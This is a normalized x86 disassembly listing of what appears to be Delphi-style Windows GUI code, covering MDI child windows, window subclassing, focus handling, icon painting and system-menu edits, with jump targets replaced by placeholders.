mov eax [ rw-data ]
call sub_453044
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_453058
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_453044
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d48
push eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d2c
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d14
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_453044
call sub_452d14
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d14
push eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d60
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d48
push eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d2c
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d14
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d60
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d48
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_453044
call sub_452d48
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d48
push eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d2c
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d14
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d60
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d14
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d60
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d48
push eax
mov edx esi
mov eax [ rw-data ]
call sub_453044
call sub_452d2c
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_44ff20
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_44d3dc
mov edx esi
mov eax edi
call sub_4528c4
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_44ffcf ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4381b4
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_4381b4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_450131
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44d3ec
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43b390
push eax
call SendMessageA
mov eax ebx
call sub_450a90
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43b390
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4345b8
push eax
mov eax ebx
call sub_4345fc
push eax
mov eax ebx
call sub_43b390
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_4068b4
mov [ ebx + 0x254 ] eax
push ebx
push sub_44f07c
call sub_41a300
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_4453e0
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_43b390
push eax
call SetWindowPos
jmp r-xdata
sub_45027e
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4503a9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_438518
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45279c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4503b0
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_4503b8
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_438784
push 0x0
mov eax ebx
call sub_43b390
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_4503fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_438f08
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_43b390
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43b390
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_450460
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_450508
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45050f
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov eax edi
call sub_44c6fc
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403324
mov eax ebx
call sub_450818
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403324
test al al
jne r-xdata
sub_450518
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_437e6c
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_437e6c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_450460
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_450560
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_450460
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_450584
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4139fc
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413934
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4139fc
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413934
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_4507f4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_43b390
mov dx 0xb000
call sub_44c4c4
test al al
jne r-xdata
call sub_43b390
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_44c4c4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507fb
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403960
jmp r-xdata
call sub_403960
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_437e6c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_43b390
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_44c4c4
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_435d5c
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
call sub_403960
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_43b390
mov dx 0xb01a
call sub_44c4c4
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403960
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_435d5c
sub_450818
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_435d5c
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_43b390
push eax
call SetFocus
mov eax ebx
call sub_43b390
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_450868
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_435d5c
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45091c
mov eax esi
call sub_450818
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_43b7b8
mov edx eax
mov eax esi
call sub_450460
sub_4508cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44f4e4
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_435d5c
mov eax ebx
call sub_44f4e4
mov edx esi
call sub_4508cc
sub_45091c
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_448f0c
mov edx esi
call sub_448ef0
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4509c4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_43b390
push eax
call SendMessageA
sub_450a10
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4509c4
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_450a40
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4509c4
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_450aac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d194
xor eax eax
push ebp
push sub_450b5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41d520
xor eax eax
push ebp
push sub_450b37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403324
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450b3e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41d520
retn
sub_450b68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_44f4e4
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_44f518
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403324
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_43a658
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_44f564
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403324
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_450c08
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b390
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_43b390
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_450a90
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_43b390
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_439520
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_450c86
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41cd7c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_450ce8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43b390
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_4397e4
pop edi
pop esi
retn
sub_450d34
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b390
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_450e30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_44f858
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_450d34
pop ecx
sub_450e64
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_436278
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43b390
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b390
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43b390
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_435250
pop esi
pop ebx
retn
sub_450ef4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43b390
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43a5e4
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_43b390
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_44892c
sub_450f54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_439680
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_448340
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_450fa0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_448ba0
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_450fd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_451073
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45107a
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
